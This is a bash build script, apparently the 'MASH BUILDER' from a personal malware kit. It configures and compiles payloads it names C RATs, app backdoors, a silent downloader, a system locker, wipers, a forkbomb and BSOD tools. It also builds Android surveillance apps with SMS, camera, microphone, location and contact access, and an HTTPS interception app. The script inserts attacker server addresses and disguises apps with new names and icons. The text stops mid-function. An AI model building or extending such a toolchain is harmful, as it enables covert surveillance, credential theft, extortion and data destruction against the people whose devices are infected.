#!/bin/bash

# Configuration
CURRENT_DIR=$(pwd)
BUILD="/home/zeus/MOD/Listeners/listener.sh"
BULL_DIR="$HOME/MOD/BULL-DozzeR"
PC_DIR="$HOME/MOD"
ANDROID_DIR="$HOME/MOD"
LISTENER="$HOME/MOD/Listener"
CONFIG_FILE="$HOME/.mash_builder_config"

# Debug mode
DEBUG=false

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
BOLD_RED='\033[1;31m'
BOLD_GREEN='\033[1;32m'
BOLD_YELLOW='\033[1;33m'
BOLD_BLUE='\033[1;34m'
BOLD_PURPLE='\033[1;35m'
NC='\033[0m' # No Color

# Initialize global configuration variables
OUTPUT_DIR="$CURRENT_DIR"
DEFAULT_ICON=""
BULL_ANNOYING_NAME="annoying"
BULL_WIPE_NAME="wipe"
BULL_FORKBOMB_NAME="forkbomb"
BULL_SILENTWIPE_NAME="silentwipe"
BULL_BSOD_NAME="BSOD"
PC_INTERPRETER_NAME="client"
PC_HOOK_NAME="client"
PC_WEBVIEW_NAME="pentool"
PC_DOWNLOADER_NAME="download"
PC_JAVA_NAME="MegaClient"
PC_JAVA_GAME_NAME="GameClient"
PC_LOCKER_NAME="SystemLocker"
ANDROID_MONITOR_NAME="monitor"
ANDROID_MONITOR2_NAME="monitor2"
ANDROID_MONITOR3_NAME="monitor3"
ANDROID_MONITOR4_NAME="monitor4"
ANDROID_HTTPS_PROXY_NAME="https_proxy"

# Payload display names mapping
declare -A PAYLOAD_DISPLAY_NAMES
PAYLOAD_DISPLAY_NAMES["hook.c"]="C RAT"
PAYLOAD_DISPLAY_NAMES["hook2.c"]="C RAT+"
PAYLOAD_DISPLAY_NAMES["hook3.c"]="C RAT++"
PAYLOAD_DISPLAY_NAMES["hook4.c"]="C RAT+++"
PAYLOAD_DISPLAY_NAMES["webview_pen.cpp"]="App Backdoor"
PAYLOAD_DISPLAY_NAMES["webview_pen2.cpp"]="App Backdoor+"
PAYLOAD_DISPLAY_NAMES["webview_pen3.cpp"]="App Backdoor++"
PAYLOAD_DISPLAY_NAMES["download.cpp"]="Silent Downloader"
PAYLOAD_DISPLAY_NAMES["syslock.cpp"]="System Locker"
PAYLOAD_DISPLAY_NAMES["MegaClient.java"]="Java RAT"
PAYLOAD_DISPLAY_NAMES["GameClient.java"]="Java Game RAT"

# Command-line variables
PAYLOAD_TYPE=""
PLATFORM=""
OUTPUT_NAME=""
ICON_PATH=""
BULL_TYPE=""
PC_SOURCE=""
ANDROID_TYPE=""
CROSS_TYPE=""
DOC_TYPE=""
SERVER_IP=""
SERVER_PORT=""
SERVER_URL=""
SOCKET_HOST=""
SOCKET_PORT=""
LAUNCH_MODE=""
SHOW_POPUP=""
STARTUP_COMMAND=""
REMOTE_SERVER_URL=""
REMOTE_SERVER_PORT=""
MAIN_URL=""
STREAM_URL=""
HTTPS_PROXY_SERVER_URL=""
HTTPS_PROXY_TARGET_WEBSITE=""
APP_NAME=""
APP_ICON_PATH=""

# Load configuration if exists
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        debug_log "Configuration loaded from $CONFIG_FILE"
    else
        debug_log "No configuration file found. Using defaults."
    fi
}

save_config() {
    cat > "$CONFIG_FILE" << EOF
OUTPUT_DIR="$OUTPUT_DIR"
DEFAULT_ICON="$DEFAULT_ICON"
BULL_ANNOYING_NAME="$BULL_ANNOYING_NAME"
BULL_WIPE_NAME="$BULL_WIPE_NAME"
BULL_FORKBOMB_NAME="$BULL_FORKBOMB_NAME"
BULL_SILENTWIPE_NAME="$BULL_SILENTWIPE_NAME"
BULL_BSOD_NAME="$BULL_BSOD_NAME"
PC_INTERPRETER_NAME="$PC_INTERPRETER_NAME"
PC_HOOK_NAME="$PC_HOOK_NAME"
PC_WEBVIEW_NAME="$PC_WEBVIEW_NAME"
PC_DOWNLOADER_NAME="$PC_DOWNLOADER_NAME"
PC_JAVA_NAME="$PC_JAVA_NAME"
PC_JAVA_GAME_NAME="$PC_JAVA_GAME_NAME"
PC_LOCKER_NAME="$PC_LOCKER_NAME"
ANDROID_MONITOR_NAME="$ANDROID_MONITOR_NAME"
ANDROID_MONITOR2_NAME="$ANDROID_MONITOR2_NAME"
ANDROID_MONITOR3_NAME="$ANDROID_MONITOR3_NAME"
ANDROID_MONITOR4_NAME="$ANDROID_MONITOR4_NAME"
ANDROID_HTTPS_PROXY_NAME="$ANDROID_HTTPS_PROXY_NAME"
EOF
    debug_log "Configuration saved to $CONFIG_FILE"
}

# Function to get display name for a payload
get_payload_display_name() {
    local file_name=$1
    echo "${PAYLOAD_DISPLAY_NAMES[$file_name]:-$file_name}"
}

# Function to print ASCII headers
print_main_menu_ascii() {
    cat << 'EOF'
            __       __     _
           /-.\     /  \   //
           \  \|_,_/|  /  ((
            `\ `    `\"    \\
            /  _   _  \     ))
           |  (0\ /0)  |   //
           \           /  //
           /`.== 0 ==.`\ ((
          /   `~~W~~`   \ \\
         |   ,       ,   | ))
         \   \       /   ///
         /`vvvv     vvvv`\/
        |                 |
        |   |         |   |
       /    (         )    \
      (v(v(v)`=.....=`(v)v)v)
EOF
}

print_mash_bull_ascii() {
    cat << 'EOF'
⠄⠄⠄⠄⠄⠄⣠⢿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⡿⣄
⠄⠄⠄⠄⠄⣰⢳⡌⣿⢀⣀⣀⣀⠄⠄⠄⠄⢀⣀⣀⡀⡞⢠⣎⣆
⠄⠄⠄⠄⢸⣣⣿⣧⠛⠉⠉⠄⠈⠉⠉⠉⠉⠉⠁⠈⠉⠁⢴⣧⣌⡆
⠄⠄⠄⠄⣾⣻⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢛⣿⣷
⠄⠄⠄⠄⣿⡏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣿⣿
⠄⠄⠄⠄⣿⣷⡤⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢹⣾⣿⣿
⠄⠄⠄⠄⡿⣏⣧⣤⣀⣀⠄⠄⠄⣺⠄⢠⡏⠄⠄⠄⣀⣤⣤⣽⣿⣿
⠄⠄⠄⢰⢷⣿⢿⣷⣉⠛⣻⣦⣀⡿⠄⠈⠃⠰⣶⣞⠋⣉⣿⠗⠉⣿⡇
⠄⠄⠄⣾⣸⣯⡴⠈⠙⠛⠛⠋⠁⠄⠄⠬⠭⣗⡀⠹⠿⣿⣫⡅⠄⣠⣿⣿
⠠⣤⡶⢿⣗⣿⣿⣦⠄⠄⠄⠄⠄⠐⠒⠒⠚⢯⡀⠸⣿⣿⣧⣾⣿⣿⣿⣦⣤⠄
⠄⠄⠉⠻⣿⣿⣿⣿⣿⣓⢀⣴⣿⣿⣿⣿⣤⣶⡆⣰⣿⣿⣿⣿⣿⣿⠟⠉
⠄⠄⠄⢀⣿⠙⣿⣿⣿⡛⡿⠛⠛⢻⣿⡿⠛⠛⠋⠘⣻⣿⣿⣿⡇⣰⣟⣉⣓⣤⣀
⣀⣴⣞⣉⣀⣢⢹⣿⣿⣷⡅⠄⢀⣨⣿⣇⣀⡀⠄⣸⣿⣿⣿⡇⣰⣟⣉⣓⣤⣀
⠉⠉⠉⠉⠉⠻⣦⡻⣿⣿⣿⣦⣿⣿⣿⡿⢿⣿⣾⣿⣿⣿⣿⣷⠏⠉⠉⠉⠉
⠄⠄⠄⠄⠄⣰⠋⣹⣦⣝⡻⠿⣿⣿⡿⠿⠿⠿⢻⣿⣿⣿⡿⠻⣆
⠄⠄⠄⠄⣼⡷⠟⠛⠙⠻⣿⠷⣶⣶⣶⣶⣶⣶⣿⣿⠟⠋⠛⠲⢮⣧
⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⢸⢀⡴⠋⠉⠉⠹⢇⢀⡇⠄⠄⠄⠄⠄⠄⠄⠁
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⡟⠁⠄⠄⠄⠄⠈⢻⡇
EOF
}

print_mash_door_pc_ascii() {
    cat << 'EOF'
         __             _,-"~^"-.
       _// )      _,-"~`         `.
     ." ( /`"-,-"`                 ;
    / 6                             ;
   /           ,             ,-"     ;
  (,__.--.      \           /        ;
   //'   /`-.\   |          |        `._________
     _.-'_/`  )  )--...,,,___\     \-----------,)
   ((("~` _.-'.-'           __`-.   )         //
         ((("`             (((---~"`         //
                                            ((________________
                                            `----""""~~~~^^^```
EOF
}

print_mash_door_android_ascii() {
    cat << 'EOF'
                  .--,       .--,
                 ( (  \.---./  ) )
                  \.__/o   o\__.
                     {=  ^  =}
                      >  -  <
       ___________.""`-------`"".____________
      / |o                            O   |  \
      | |                                 |  |
      | |.    O                          o|/\|
      | |                                 |\/|         __
      | |                                 |  |     _.-'  `.
      \_|____________o__________o_________|__/ .-~^        `~--'
                    ___)( )(___        `-.___.'
                   (((__) (__)))
EOF
}

print_mash_cross_ascii() {
    cat << 'EOF'
   _    _
  (o)__(o)
   \ .. /  (
   ==\/==   )
   (m  m)  (
  m(____)m__)
EOF
}

print_mash_doc_ascii() {
    cat << 'EOF'
  q-p
 /\"/\
(`=*=')
 ^---^`-._
EOF
}

# Spinner animation
spinner() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    echo -n " "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Debug logging
debug_log() {
    if [ "$DEBUG" = true ]; then
        echo -e "${YELLOW}[DEBUG] $1${NC}" >&2
    fi
}

# Error handling
handle_error() {
    local error_message=$1
    echo -e "${RED}ERROR: $error_message${NC}"
    read -p "Press Enter to continue..."
    return 1
}

# Run command with spinner and log
run_with_spinner() {
    local command="$1"
    local log_file=$(mktemp)
    local pid
    
    debug_log "Running command: $command"
    echo -e "${YELLOW}Running: $command${NC}" > "$log_file"
    eval "$command" >> "$log_file" 2>&1 &
    pid=$!
    
    spinner $pid
    wait $pid
    local status=$?
    
    echo -e "\n${BLUE}Build Log:${NC}"
    cat "$log_file"
    rm "$log_file"
    
    return $status
}

# Function to display header
display_header() {
    clear
    echo -e "${BOLD_RED}"
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   __  __           _ ____  _     _                                           ║
║  |  \/  | ___   __| |  _ \(_)___| |__   ___ _ __ ___   ___ _ __   __ _       ║
║  | |\/| |/ _ \ / _` | | | | / __| '_ \ / _ \ '__/ __| / __| '_ \ / _` |      ║
║  | |  | | (_) | (_| | |_| | \__ \ | | |  __/ |  \__ \_\__ \ |_) | (_| |      ║
║  |_|  |_|\___/ \__,_|____/|_|___/_| |_|\___|_|  |___(_)___/ .__/ \__, |      ║
║                                                          |_|    |___/        ║
║                                                                              ║
║                           MASH BUILDER v1.0                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Function to safely replace variables in files
replace_var() {
    local file_path=$1
    local var_name=$2
    local new_value=$3
    local file_type=$4
    
    debug_log "Replacing $var_name with $new_value in $file_path"
    
    case $file_type in
        "c_define")
            # For C #define statements
            sed -i "s|^#define[[:space:]]\+$var_name[[:space:]]\+\"[^\"]*\"|#define $var_name \"$new_value\"|" "$file_path"
            ;;
        "c_define_num")
            # For C #define statements with numeric values
            sed -i "s|^#define[[:space:]]\+$var_name[[:space:]]\+[0-9]\+|#define $var_name $new_value|" "$file_path"
            ;;
        "cpp_string")
            # For C++ string variables - improved pattern
            sed -i "s|^\([[:space:]]*const[[:space:]]*\)\?\([[:space:]]*std::string[[:space:]]\+\)$var_name[[:space:]]*=[[:space:]]*\"[^\"]*\"|\1\2$var_name = \"$new_value\"|" "$file_path"
            ;;
        "cpp_num")
            # For C++ numeric variables - improved pattern
            sed -i "s|^\([[:space:]]*const[[:space:]]*\)\?\([[:space:]]*int[[:space:]]\+\)$var_name[[:space:]]*=[[:space:]]*[0-9]\+|\1\2$var_name = $new_value|" "$file_path"
            ;;
        "cpp_bool")
            # For C++ boolean variables - improved pattern
            sed -i "s|^\([[:space:]]*const[[:space:]]*\)\?\([[:space:]]*bool[[:space:]]\+\)$var_name[[:space:]]*=[[:space:]]*[a-zA-Z]\+|\1\2$var_name = $new_value|" "$file_path"
            ;;
        "java_string")
            # For Java string variables
            sed -i "s|^\(private static final String \|private var \|private val \)\+$var_name[[:space:]]*=[[:space:]]*\"[^\"]*\"|\1$var_name = \"$new_value\"|" "$file_path"
            ;;
    esac
}

# Function to show variable changes
show_variable_changes() {
    local file_path=$1
    local source_type=$2
    
    echo -e "${BLUE}Updated variables in $file_path:${NC}"
    
    case $source_type in
        "hook.c")
            echo "Server IP: $(grep -oP 'char\s+server_ip\[16\]\s*=\s*"\K[^"]+' "$file_path")"
            echo "Server Port: $(grep -oP '#define\s+SERVER_PORT\s+\K[0-9]+' "$file_path")"
            ;;
        "hook2.c"|"hook3.c"|"hook4.c")
            echo "Server URL: $(grep -oP '#define\s+SERVER_URL\s+"\K[^"]+' "$file_path")"
            echo "Socket Host: $(grep -oP '#define\s+SOCKET_HOST\s+"\K[^"]+' "$file_path")"
            echo "Socket Port: $(grep -oP '#define\s+SOCKET_PORT\s+\K[0-9]+' "$file_path")"
            ;;
        "webview_pen.cpp")
            echo "Server URL: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$file_path")"
            echo "Server Port: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$file_path")"
            ;;
        "webview_pen2.cpp")
            echo "Launch Mode: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$file_path")"
            echo "Show Popup: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$file_path")"
            echo "Startup Command: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$file_path")"
            echo "Server URL: $(grep -oP 'std::string\s+remote_server_url\s*=\s*"\K[^"]+' "$file_path")"
            echo "Server Port: $(grep -oP 'int\s+remote_server_port\s*=\s*\K[0-9]+' "$file_path")"
            ;;
        "webview_pen3.cpp")
            echo "Launch Mode: $(grep -oP 'const\s+int\s+LAUNCH_MODE\s*=\s*\K[0-9]+' "$file_path")"
            echo "Show Popup: $(grep -oP 'const\s+bool\s+SHOW_POPUP\s*=\s*\K[a-zA-Z]+' "$file_path")"
            echo "Startup Command: $(grep -oP 'const\s+std::string\s+STARTUP_COMMAND\s*=\s*"\K[^"]+' "$file_path")"
            echo "Server URL: $(grep -oP 'const\s+std::string\s+SERVER_URL\s*=\s*"\K[^"]+' "$file_path")"
            ;;
        "download.cpp")
            echo "Server URL: $(grep -oP 'std::string\s+url\s*=\s*"http://\K[^"]+' "$file_path")"
            echo "File name: $(grep -oP 'std::vector<std::string>\s+files\s*=\s*{\s*"\K[^"]+' "$file_path")"
            ;;
        "syslock.cpp")
            echo "Password: $(grep -oP '#define\s+PASSWORD\s+L"\K[^"]+' "$file_path")"
            ;;
        "MegaClient.java"|"GameClient.java")
            echo "Server URL: $(grep -oP 'private\s+static\s+final\s+String\s+SERVER_URL\s*=\s*"\K[^"]+' "$file_path")"
            ;;
        "MainActivity.java")
            echo "Server URL: $(grep -oP 'private\s+var\s+serverUrl\s*=\s*"\K[^"]+' "$file_path")"
            echo "Stream Server URL: $(grep -oP 'private\s+var\s+streamServerUrl\s*=\s*"\K[^"]+' "$file_path")"
            ;;
        "MainActivity.kt")
            echo "Server URL: $(grep -oP 'private\s+val\s+serverUrl\s*=\s*"\K[^"]+' "$file_path")"
            echo "Target Website: $(grep -oP 'private\s+val\s+targetWebsite\s*=\s*"\K[^"]+' "$file_path")"
            ;;
    esac
    
    echo "--------------------------------------"
}

# Function to create icon resource
create_icon_resource() {
    local image_path=$1
    local icon_name=$(basename "$image_path" | cut -d. -f1)
    local ico_file="${icon_name}.ico"
    local rc_file="${icon_name}.rc"
    local res_file="${icon_name}.res"
    
    # Convert image to ICO
    if command -v magick &> /dev/null; then
        magick convert "$image_path" -resize 256x256,128x128,64x64,48x48,32x32,16x16 "$ico_file"
    else
        echo -e "${RED}ImageMagick not found. Cannot create icon.${NC}"
        return 1
    fi
    
    # Create resource file
    cat > "$rc_file" << EOF
1 ICON "$ico_file"
EOF
    
    # Compile resource
    if command -v x86_64-w64-mingw32-windres &> /dev/null; then
        x86_64-w64-mingw32-windres "$rc_file" -O coff -o "$res_file"
    else
        echo -e "${RED}MinGW windres not found. Cannot compile resource.${NC}"
        return 1
    fi
    
    echo "$res_file"
    return 0
}

# Android Project Configuration Functions
configure_android_project() {
    local project_name=$1
    local project_dir=""
    local main_activity=""
    local monitor_service=""
    local manifest=""
    
    case $project_name in
        "Monitor")
            project_dir="$HOME/MOD/Monitor"
            main_activity="$project_dir/app/src/main/java/com/example/monitor/MainActivity.kt"
            monitor_service="$project_dir/app/src/main/java/com/example/monitor/MonitorService.kt"
            manifest="$project_dir/app/src/main/AndroidManifest.xml"
            ;;
        "Monitor2")
            project_dir="$HOME/MOD/Monitor2"
            main_activity="$project_dir/app/src/main/java/com/example/monitor/MainActivity.kt"
            monitor_service="$project_dir/app/src/main/java/com/example/monitor/MonitorService.kt"
            manifest="$project_dir/app/src/main/AndroidManifest.xml"
            ;;
        "Monitor3")
            project_dir="$HOME/MOD/Monitor3"
            main_activity="$project_dir/app/src/main/java/com/example/monitor/MainActivity.kt"
            monitor_service="$project_dir/app/src/main/java/com/example/monitor/MonitorService.kt"
            manifest="$project_dir/app/src/main/AndroidManifest.xml"
            ;;
        "Monitor4")
            project_dir="$HOME/MOD/Monitor4"
            main_activity="$project_dir/app/src/main/java/com/example/monitor/MainActivity.kt"
            monitor_service="$project_dir/app/src/main/java/com/example/monitor/MonitorService.kt"
            manifest="$project_dir/app/src/main/AndroidManifest.xml"
            ;;
        "HTTPSProxy")
            project_dir="$HOME/MOD/websession"
            main_activity="$project_dir/app/src/main/java/com/example/monitor/MainActivity.kt"
            ;;
    esac
    
    # Create backups
    echo -e "${YELLOW}[*] Creating backups...${NC}"
    if [ -f "$main_activity" ]; then
        cp "$main_activity" "${main_activity}.backup" && echo -e "  ${GREEN}> MainActivity backed up${NC}"
    fi
    if [ -f "$monitor_service" ]; then
        cp "$monitor_service" "${monitor_service}.backup" && echo -e "  ${GREEN}> MonitorService backed up${NC}"
    fi
    if [ -f "$manifest" ]; then
        cp "$manifest" "${manifest}.backup" && echo -e "  ${GREEN}> AndroidManifest.xml backed up${NC}"
    fi
    echo ""
    
    # Configure server URLs
    if [ "$project_name" != "HTTPSProxy" ]; then
        echo -e "${CYAN}[*] Server Configuration${NC}"
        echo -e "${BLUE}-------------------------------------------${NC}"
        
        # Check if command-line URLs are provided
        if [ -n "$MAIN_URL" ]; then
            main_url="$MAIN_URL"
            echo -e "  ${GREEN}> Using command-line main URL: $main_url${NC}"
        else
            echo -ne "${CYAN}Enter main server URL (wss://...):${NC} "
            read main_url
        fi
        
        if [ -n "$STREAM_URL" ]; then
            stream_url="$STREAM_URL"
            echo -e "  ${GREEN}> Using command-line stream URL: $stream_url${NC}"
        else
            echo -ne "${CYAN}Enable streaming? (y/n):${NC} "
            read enable_stream
            
            if [[ "$enable_stream" =~ ^[Yy]$ ]]; then
                echo -ne "${CYAN}Enter streaming server URL (wss://...):${NC} "
                read stream_url
            else
                stream_url=""
            fi
        fi
        
        if [ -n "$main_url" ]; then
            if [ -f "$monitor_service" ]; then
                sed -i "s|private var serverUrl = \"wss://[^\"]*\"|private var serverUrl = \"$main_url\"|" "$monitor_service"
                echo -e "  ${GREEN}> Main server URL updated: $main_url${NC}"
            else
                sed -i "s|private var serverUrl = \"wss://[^\"]*\"|private var serverUrl = \"$main_url\"|" "$main_activity"
                echo -e "  ${GREEN}> Main server URL updated: $main_url${NC}"
            fi
        fi
        
        if [ -n "$stream_url" ]; then
            if [ -f "$monitor_service" ]; then
                sed -i "s|private var streamServerUrl = \"wss://[^\"]*\"|private var streamServerUrl = \"$stream_url\"|" "$monitor_service"
                echo -e "  ${GREEN}> Stream server URL updated: $stream_url${NC}"
            else
                sed -i "s|private var streamServerUrl = \"wss://[^\"]*\"|private var streamServerUrl = \"$stream_url\"|" "$main_activity"
                echo -e "  ${GREEN}> Stream server URL updated: $stream_url${NC}"
            fi
        fi
    else
        # HTTPS Proxy configuration
        echo -e "${CYAN}[*] HTTPS Proxy Configuration${NC}"
        echo -e "${BLUE}-------------------------------------------${NC}"
        
        if [ -f "$main_activity" ]; then
            current_server_url=$(grep -oP 'private val serverUrl = "\K[^"]+' "$main_activity")
            current_target_website=$(grep -oP 'private val targetWebsite = "\K[^"]+' "$main_activity")
            
            echo -e "  ${YELLOW}> Current server URL: $current_server_url${NC}"
            echo -e "  ${YELLOW}> Current target website: $current_target_website${NC}"
            
            if [ -n "$HTTPS_PROXY_SERVER_URL" ]; then
                new_server_url="$HTTPS_PROXY_SERVER_URL"
                echo -e "  ${GREEN}> Using command-line server URL: $new_server_url${NC}"
            else
                echo -ne "${CYAN}Enter new server URL (leave empty to keep current):${NC} "
                read new_server_url
            fi
            
            if [ -n "$HTTPS_PROXY_TARGET_WEBSITE" ]; then
                new_target_website="$HTTPS_PROXY_TARGET_WEBSITE"
                echo -e "  ${GREEN}> Using command-line target website: $new_target_website${NC}"
            else
                echo -ne "${CYAN}Enter new target website (leave empty to keep current):${NC} "
                read new_target_website
            fi
            
            if [ -n "$new_server_url" ]; then
                sed -i "s|private val serverUrl = \"[^\"]*\"|private val serverUrl = \"$new_server_url\"|" "$main_activity"
                echo -e "  ${GREEN}> Server URL updated${NC}"
            fi
            
            if [ -n "$new_target_website" ]; then
                sed -i "s|private val targetWebsite = \"[^\"]*\"|private val targetWebsite = \"$new_target_website\"|" "$main_activity"
                echo -e "  ${GREEN}> Target website updated${NC}"
            fi
        else
            echo -e "${RED}[!] MainActivity.kt not found at $main_activity${NC}"
        fi
    fi
    echo ""
    
    # Configure permissions
    if [ "$project_name" != "HTTPSProxy" ]; then
        echo -e "${CYAN}[*] Permissions Configuration${NC}"
        echo -e "${BLUE}-------------------------------------------${NC}"
        echo -e "${YELLOW}Available removable permissions:${NC}"
        echo -e "  ${WHITE}1.${NC} ${CYAN}location${NC} (ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, ACCESS_BACKGROUND_LOCATION)"
        echo -e "  ${WHITE}2.${NC} ${CYAN}sms${NC} (READ_SMS, RECEIVE_SMS, SEND_SMS)"
        echo -e "  ${WHITE}3.${NC} ${CYAN}call_log${NC} (READ_CALL_LOG, WRITE_CALL_LOG)"
        echo -e "  ${WHITE}4.${NC} ${CYAN}phone${NC} (CALL_PHONE)"
        echo -e "  ${WHITE}5.${NC} ${CYAN}camera${NC} (CAMERA)"
        echo -e "  ${WHITE}6.${NC} ${CYAN}microphone${NC} (RECORD_AUDIO)"
        echo -e "  ${WHITE}7.${NC} ${CYAN}contacts${NC} (READ_CONTACTS)"
        echo ""
        echo -ne "${YELLOW}Type permissions to remove (space-separated) or '-all' to keep everything:${NC} "
        read perm_input
        
        if [ "$perm_input" != "-all" ]; then
            declare -A perm_map
            perm_map["location"]="ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION ACCESS_BACKGROUND_LOCATION"
            perm_map["sms"]="READ_SMS RECEIVE_SMS SEND_SMS"
            perm_map["call_log"]="READ_CALL_LOG WRITE_CALL_LOG"
            perm_map["phone"]="CALL_PHONE"
            perm_map["camera"]="CAMERA FOREGROUND_SERVICE_CAMERA"
            perm_map["microphone"]="RECORD_AUDIO FOREGROUND_SERVICE_MICROPHONE"
            perm_map["contacts"]="READ_CONTACTS"
            
            perms_to_remove=""
            for perm in $perm_input; do
                if [ -n "${perm_map[$perm]}" ]; then
                    perms_to_remove="$perms_to_remove ${perm_map[$perm]}"
                    echo -e "  ${RED}> Removing $perm permissions${NC}"
                fi
            done
            
            if [ -n "$perms_to_remove" ]; then
                echo -e "  ${YELLOW}> Processing MainActivity...${NC}"
                for perm in $perms_to_remove; do
                    if [ -f "$main_activity" ]; then
                        sed -i "/arrayOf(/,/^[[:space:]]*)/{ /Manifest\.permission\.$perm[,)]/d; }" "$main_activity"
                    fi
                done
                echo -e "  ${GREEN}> Updated MainActivity${NC}"
                
                if [ -f "$monitor_service" ]; then
                    echo -e "  ${YELLOW}> Processing MonitorService...${NC}"
                    for perm in $perms_to_remove; do
                        sed -i "/arrayOf(/,/^[[:space:]]*)/{ /Manifest\.permission\.$perm[,)]/d; }" "$monitor_service"
                    done
                    echo -e "  ${GREEN}> Updated MonitorService${NC}"
                fi
                
                if [ -f "$manifest" ]; then
                    echo -e "  ${YELLOW}> Processing AndroidManifest.xml...${NC}"
                    for perm in $perms_to_remove; do
                        sed -i "/<uses-permission[^>]*android:name=\"android\.permission\.$perm\"/d" "$manifest"
                        
                        case $perm in
                            CAMERA)
                                sed -i 's/foregroundServiceType="camera|/foregroundServiceType="/g' "$manifest"
                                sed -i 's/|camera"/"/g' "$manifest"
                                sed -i 's/foregroundServiceType="camera"/foregroundServiceType="dataSync"/g' "$manifest"
                                ;;
                            RECORD_AUDIO)
                                sed -i 's/foregroundServiceType="microphone|/foregroundServiceType="/g' "$manifest"
                                sed -i 's/|microphone"/"/g' "$manifest"
                                ;;
                            ACCESS_FINE_LOCATION|ACCESS_COARSE_LOCATION|ACCESS_BACKGROUND_LOCATION)
                                sed -i 's/foregroundServiceType="location|/foregroundServiceType="/g' "$manifest"
                                sed -i 's/|location"/"/g' "$manifest"
                                ;;
                        esac
                    done
                    
                    sed -i 's/foregroundServiceType="|/foregroundServiceType="/g' "$manifest"
                    sed -i 's/|"/"/g' "$manifest"
                    sed -i 's/||/|/g' "$manifest"
                    sed -i 's/foregroundServiceType=""[^>]*/foregroundServiceType="dataSync"/g' "$manifest"
                    
                    echo -e "  ${GREEN}> Updated AndroidManifest.xml${NC}"
                fi
            fi
        fi
        echo ""
    fi
    
    # Configure app appearance
    echo -e "${CYAN}[*] App Appearance Configuration${NC}"
    echo -e "${BLUE}-------------------------------------------${NC}"
    
    # App Name Configuration
    if [ -n "$APP_NAME" ]; then
        NEW_NAME="$APP_NAME"
        echo -e "  ${GREEN}> Using command-line app name: $NEW_NAME${NC}"
    else
        echo -ne "${YELLOW}Change app name? (y/n):${NC} "
        read change_name
        if [[ "$change_name" =~ ^[Yy]$ ]]; then
            echo -ne "${CYAN}Enter the new app name:${NC} "
            read NEW_NAME
        fi
    fi
    
    if [ -n "$NEW_NAME" ]; then
        STRINGS_XML="$project_dir/app/src/main/res/values/strings.xml"
        if [ -f "$STRINGS_XML" ]; then
            old_name=$(grep -oP '(?<=<string name="app_name">).*(?=</string>)' "$STRINGS_XML")
            if [ -n "$old_name" ]; then
                sed -i "s|<string name=\"app_name\">$old_name</string>|<string name=\"app_name\">$NEW_NAME</string>|" "$STRINGS_XML"
                echo -e "  ${GREEN}> Changed app_name: \"$old_name\" -> \"$NEW_NAME\"${NC}"
            fi
        else
            echo -e "  ${RED}> strings.xml not found at $STRINGS_XML${NC}"
        fi
    fi
    
    # App Icon Configuration
    if [ -n "$APP_ICON_PATH" ]; then
        IMG_PATH="$APP_ICON_PATH"
        echo -e "  ${GREEN}> Using command-line icon: $IMG_PATH${NC}"
        change_icon="y"
    else
        echo -ne "${YELLOW}Change app icon? (y/n):${NC} "
        read change_icon
        if [[ "$change_icon" =~ ^[Yy]$ ]]; then
            echo -ne "${CYAN}Enter the new image path:${NC} "
            read IMG_PATH
        fi
    fi
    
    if [[ "$change_icon" =~ ^[Yy]$ ]] && [ -n "$IMG_PATH" ]; then
        if ! command -v magick &> /dev/null; then
            echo -e "${RED}[!] ImageMagick not found. Install with: sudo apt install imagemagick${NC}"
        else
            if [ -f "$IMG_PATH" ]; then
                echo -e "  ${YELLOW}> Starting icon replacement...${NC}"
                
                RES_DIR="$project_dir/app/src/main/res"
                find "$RES_DIR" -type d -name "mipmap*" | while read -r folder; do
                    for icon in ic_launcher.webp ic_launcher_round.webp ic_launcher_foreground.webp; do
                        TARGET="$folder/$icon"
                        if [ -f "$TARGET" ]; then
                            size=$(identify -format "%wx%h" "$TARGET" 2>/dev/null)
                            width=${size%x*}
                            height=${size#*x}
                            
                            if [ -n "$width" ] && [ -n "$height" ]; then
                                TMP_FILE="/tmp/new_icon_${RANDOM}.png"
                                magick "$IMG_PATH" -resize "${width}x${height}!" -alpha set "$TMP_FILE"
                                
                                if [[ "$icon" == *round* ]]; then
                                    magick "$TMP_FILE" \
                                        \( -size "${width}x${height}" xc:none -fill white \
                                           -draw "circle $((width/2)),$((height/2)) $((width/2)),$((height/2 - width/2 + width/10))" \) \
                                        -alpha set -compose CopyOpacity -composite "$TMP_FILE"
                                else
                                    radius=$((width / 5))
                                    magick "$TMP_FILE" \( +clone  -alpha extract \
                                      -draw "fill black polygon 0,0 0,$radius $radius,0 fill white circle $radius,$radius $radius,0" \
                                      \( +clone -flip \) -compose Multiply -composite \
                                      \( +clone -flop \) -compose Multiply -composite \
                                      \) -alpha off -compose CopyOpacity -composite "$TMP_FILE"
                                fi
                                
                                magick "$TMP_FILE" "$TARGET"
                                rm -f "$TMP_FILE"
                            fi
                        fi
                    done
                done
                
                DRAWABLE_DIR="$RES_DIR/drawable"
                mkdir -p "$DRAWABLE_DIR"
                cp "$IMG_PATH" "$DRAWABLE_DIR/images.png"
